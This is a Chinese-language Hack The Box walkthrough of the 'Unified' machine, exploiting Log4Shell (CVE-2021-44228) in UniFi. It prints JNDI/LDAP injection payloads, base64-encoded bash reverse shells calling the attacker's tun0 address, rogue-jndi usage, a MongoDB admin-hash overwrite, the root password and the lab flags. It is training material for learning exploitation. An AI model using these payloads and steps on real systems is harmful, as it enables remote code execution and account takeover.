---
title: HTB-Unified
description: 'Hack the box'
pubDate: 2024-03-03 
image: /hackthebox/Unified.png
categories:
  - Documentation
tags:
  - Hackthebox
  - Linux Machine
---

## TASK 1
![](/image/hackthebox/Unified-1.png)

利用nmap扫描即可

## TASK 2
![](/image/hackthebox/Unified-2.png)

查看8080网站标题即可

## TASK 3
![](/image/hackthebox/Unified-1.png)

![](/image/hackthebox/Unified-4.png)

![](/image/hackthebox/Unified-5.png)仔细观察登录窗口即可

## TASK 4
![](/image/hackthebox/Unified-6.png)

这时候就要想到了既然给了一个cms框架，也知道具体版本，那么就可以去搜索一下这个版本的unifi有没有什么cve  
果然，通过Google得知unifi 6.4.54存在漏洞CVE-2021-44228，是一个log4j漏洞

![](/image/hackthebox/Unified-7.png)

## TASK 5
![](/image/hackthebox/Unified-8.png)

### 漏洞利用
[https://cloud.tencent.com/developer/article/1922132](https://cloud.tencent.com/developer/article/1922132)

### 漏洞复现
先测试一下是否有漏洞

使用burp或者开发者工具抓取登录时的数据包，同时使用tcpdump抓取攻击机tun0的389端口

sudo tcpdump -i tun0 port 389

编辑登录数据包，在data的remember字段中把flase改成"${jndi:ldap://10.10.16.20/whatever}"，重新发送数据包

![](/image/hackthebox/Unified-9.png)

![](/image/hackthebox/Unified-10.png)

成功接收到数据

#### 环境搭建
在进行漏洞利用前，要先配置好漏洞利用环境  
首先先安装jdk，之后再使用sudo apt-get install maven命令安装mvn  
安装mvn是用于编译rogue-jndi

什么是rogue-jndi？  
rogue-jndi会开启一个本地的LDAP服务器，允许我们接收来自有漏洞的服务器的连接并执行恶意代码

```plain
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```

这里踩坑了

maven需要换国内源

查教程搞了半天才搞好

![](/image/hackthebox/Unified-11.png)

![](/image/hackthebox/Unified-2.png)

这时我们成功拿到了RogueJndi的jar包

### 漏洞原理
此 Log4J 漏洞可通过注入操作系统命令 (OS Command Injection) 来利用，这是一种 Web [安全漏洞](https://so.csdn.net/so/search?q=%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E&spm=1001.2101.3001.7020)，允许攻击者在运行应用程序的服务器上执行任意操作系统命令，通常会完全破坏应用程序并破坏其数据。

   
JDIN（Java Distributed INterfaces）是一种用于创建分布式应用程序的Java框架。它提供了一组API和工具，用于在分布式环境中创建和管理对象。JDIN旨在简化分布式系统的开发，通过提供通信和远程对象访问的机制，使开发人员能够更轻松地构建分布式应用程序。



LDAP（轻量目录访问协议）是一种用于访问和维护分布式目录信息的协议。它通常用于管理用户身份验证、访问控制和资源配置等信息。LDAP提供了一种层次结构的数据模型，类似于文件系统中的目录结构，其中包含了各种类型的数据条目。LDAP客户端可以通过LDAP协议与LDAP服务器进行通信，执行查询、添加、修改和删除条目等操作。



在实际应用中，JDIN和LDAP可以一起使用，以构建具有分布式功能的应用程序并管理用户身份验证和访问控制。例如，可以使用JDIN来开发分布式系统的业务逻辑，并使用LDAP来存储和管理用户信息、权限和配置信息。通过将这两种技术结合使用，开发人员可以构建强大的分布式应用程序，同时实现灵活的身份验证和访问控制机制。



JNDI注入：

动态协议转换：JNDI提前有配置初始化环境，设置了属性，但是当lookup()里传进来的参数协议与初始化的Context里配置的协议不一致时，就会动态的进行转换来查找传进去的参数，并且不会报错，所以当参数可控时，攻击者可以通过提供一个恶意的url地址来控制受害者加载攻击者指定的恶意类。



ctx.lookup("rmi://your-server/refObj");// 初始化的

ctx.lookup("ldap://your-server/cn=bar,dc=test,dc=org");//实际上传进来的

**命名引用**：Java为了将Object对象存储在Naming（命名）或Directory（目录）服务下，提供了Naming Reference（命名引用）功能，对象可以通过绑定Reference类存储在Naming或Directory服务下，比如RMI、LDAP等。

有点超链接的感觉

总结：

在LDAP中可以存储外部的资源，叫做命名引用，对应Reference类。比如远程HTTP服务的一个.class文件

如果JNDI客户端基于LDAP服务，找不到相应的资源，就会去LDAP中默认指定的地址请求（初始化配置的），如果是命名引用，会将这个文件下载到本地。

如果下载的.class文件包含无参构造函数或静态代码块，加载的时候会自动执行。因为下载之后会进行自动实例化。

在使用Reference时，我们可以直接将对象传入构造方法中，当被调用时，对象的方法就会被触发，创建Reference实例时几个比较关键的属性：

**className：**远程加载时所使用的类名；

**classFactory：**加载的class中需要实例化类的名称；

**classFactoryLocation：**远程加载类的地址，提供class数据的地址可以是file/ftp/http等协议；

**Log4j2 rce原理**

首先log4j打印日志有四个级别：debug、info、warn、error，不管哪个方法打印日志，在正常的log处理过程中，对KaTeX parse error: Expected '}', got 'EOF' at end of input: …。 一旦在log字符串中检测到{}，就会解析其中的字符串尝试使用lookup查询，因此只要能控制log参数内容，就有机会实现漏洞利用。

![](/image/hackthebox/Unified-13.png)

修复思路

1、禁止用户请求参数中出现攻击关键字

2、禁止lookup下载远程文件（命名引用）

3、禁止log4j的应用连接外网

4、禁止log4j使用lookup

2.15版本修复方法：

修复后log4j2在jndi lookup中增加了很多限制：

默认不再支持二次跳转（命名引用）的方式获取对象

只有在log4j2.allowedLdapClasses列表中指定的class才能获取

只有远程地址是本地或者在log4j2.allowedLdapHosts列表中指定的地址才能获取

综上所述我们可以知道**JNDI 在注入中利用 LDAP协议**

## TASK 6
![](/image/hackthebox/Unified-14.png)

Tcpdump

刚刚示范的那样tcpdump抓取攻击机tun0的389端口

sudo tcpdump -i tun0 port 389

编辑登录数据包，在data的remember字段中把flase改成"${jndi:ldap://10.10.16.20/whatever}"

接收到数据

> TCPDump 是一个功能强大的网络抓包工具，它可以截取网络数据包并将其显示或保存为文件。它在网络诊断和分析中非常有用，可以帮助网络管理员和安全专家了解网络流量，排查问题，分析网络性能，以及进行安全审计等。
>

## TASK 7
![](/image/hackthebox/Unified-15.png)

389端口

## TASK 8
![](/image/hackthebox/Unified-16.png)

看到这道题基本清楚要开始漏洞复现了

### 漏洞复现
现在我们可以构造payload以传递给 RogueJndi-1-1.jar Java 应用程序。

要使用 Rogue-JNDI 服务器，我们必须构造并传递一个payload，该payload将负责在目标系统上为我们提供一个 shell。对payload进行 Base64 编码，以防止出现任何编码问题。

echo 'bash -c bash -i >&/dev/tcp/your_tun0_ip/port 0>&1' | base64

打印出一串base64编码的字符

YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjAvNDQzIDA+JjEK

接下来使用RogueJndi-1.1.jar并监听4444端口

> java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjAvNDQzIDA+JjEK}|{base64,-d}|{bash,-i}" --hostname "10.10.16.20"![](/image/hackthebox/Unified-17.png)
>

利用tomcat传参

ldap://10.10.16.20:1389/o=tomcat

"${jndi:ldap://10.10.16.20:1389/o=tomcat/whatever}"

按理来讲应该getshell了呀，为什么不弹呢，重新来一次吧

echo 'bash -c bash -i >&/dev/tcp/10.10.16.20/4433 0>&1' | base64

YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjAvNDQzMyAwPiYxCg==

java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjAvNDQzMyAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.16.20"

ldap://10.10.16.20:1389/o=tomcat

"${jndi:ldap://10.10.16.20:1389/o=tomcat/whatever}"

还是不弹，见鬼了

再来！！

echo 'bash -c bash -i >&/dev/tcp/10.10.16.20/4444 0>&1' | base64

YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjAvNDQ0NCAwPiYxCg==

java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjAvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.16.20"

呜呜终于弹了

原来是多打了个whatever导致的

"${jndi:ldap://10.10.16.20:1389/o=tomcat}"

![](/image/hackthebox/Unified-18.png)

由于不是交互式shell看着难受咱们可以改一下

SHELL=/bin/bash script -q /dev/null : 

使用**ps aux**查看系统有哪些进程，发现27117端口存在mongodb数据库

> + **a**：表示显示所有用户的进程，而不仅仅是当前用户的进程。
> + **u**：表示以用户为主要输出格式，并显示与进程相关的详细信息，如用户、进程ID（PID）、CPU使用率、内存使用情况、启动时间、进程状态等。
> + **x**：表示显示不与终端关联的进程。通常情况下，**ps** 命令只会显示与当前终端相关的进程，而使用 **x** 选项可以显示所有进程，包括那些不与终端关联的后台进程。
>

****

![](/image/hackthebox/Unified-19.png)

由于看的界面非常小，所以我们将这个输出到文档里，之后cat进行查看

ps aux > process_list.txt

cat process_list.txt

![](/image/hackthebox/Unified-20.png)

可以看见端口在27117开放

## TASK 9
![](/image/hackthebox/Unified-21.png)

mongodb --port 2717

直接本地进行连接数据库

![](/image/hackthebox/Unified-22.png)show dbs一下

发现默认数据库名字为ace

## TASK 10
![](/image/hackthebox/Unified-23.png)

db.admin.find()

## TASK 11
![](/image/hackthebox/Unified-24.png)

db.admin.update()

## TASK 12
![](/image/hackthebox/Unified-25.png)

![](/image/hackthebox/Unified-26.png)

发现admin的账号以及密码

发现存在administrator，但是由于密码是进过sha512加密后的结果，我们并不能直接得到密码  
同时由于加密强度很高，我们只能通过hash碰撞破解密码，但是成功率也很低  
这时想到可以把administrator的密码修改成弱密码如password  
先使用**mkpasswd -m sha-512 password**命令，得到password的sha512加密后的值

$6$H/9uby/SS.lqTZt1$AxcFwPi8z5MpDd1D7Efv/xrEiPE2TZxKHKqOVk//b/salsNhZfwY2jtKfUQPdsJU8RXCl7iP9NzPD6YDnGeae0

db.admin.insert({

  "email": "pilgrim@localhost.local",

  "last_site_name": "default",

  "name": "unifiadmin",

  "time_created": NumberLong(100019800), 

  "x_shadow": "$6$H/9uby/SS.lqTZt1$AxcFwPi8z5MpDd1D7Efv/xrEiPE2TZxKHKqOVk//b/salsNhZfwY2jtKfUQPdsJU8RXCl7iP9NzPD6YDnGeae0"

})





![](/image/hackthebox/Unified-27.png)

执行成功后寻找刚刚添加的用户

db.admin.find().forEach(printjson);

![](/image/hackthebox/Unified-28.png)

id 65e48cdb4a29d756feab4d2a

**查看一下网站的用户的详细信息**  
db.site.find().forEach(printjson);

这里由于不回显导致无法进行下一步（按理来说应该回显的）

**将我们插入的用户绑定到这个网站上去，其中的admin_id就是自己添加的用户的id，site_id就是上面获取的id**

**db.privilege.insert({"admin_id":"xxxx","permisions":[],"role":"admin","site_id":"xxxx"});**

接着去后台登录的页面登录刚才的账号，密码是自己设置的密码。

在setting中能知道root的密码如下：  
NotACrackablePassword4U2022然后ssh登录就行了



这里由于无法回显咱们换一个方法

先使用**mkpasswd -m sha-512 password**命令，得到password的sha512加密后的值

$6$6LGfhVdE.SrlGbsq$j///PNBrdvqlNnL35Lqoowj51HgTmEiw1vKfCZDUq9BoGq9Dk3E4pIXufMWz6cmRQV6lYctTpYQwAe15PWYN3/

将administrator的密码修改为password

mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set：{"x_shadow":"$$6$6LGfhVdE.SrlGbsq$j///PNBrdvqlNnL35Lqoowj51HgTmEiw1vKfCZDUq9BoGq9Dk3E4pIXufMWz6cmRQV6lYctTpYQwAe15PWYN3/"}})'

再使用修改后的密码登录网站，登录成功

![](/image/hackthebox/Unified-29.png)

后台设置里看到ssh密码

![](/image/hackthebox/Unified-30.png)

NotACrackablePassword4U2022

ssh远程连接后以为root用户，提权成功

ssh root@10.129.45.240

user.txt

6ced1a6a89e666c0620cdb10262ba127

root.txt

e50bc93c75b634e4b272d2f771c33681

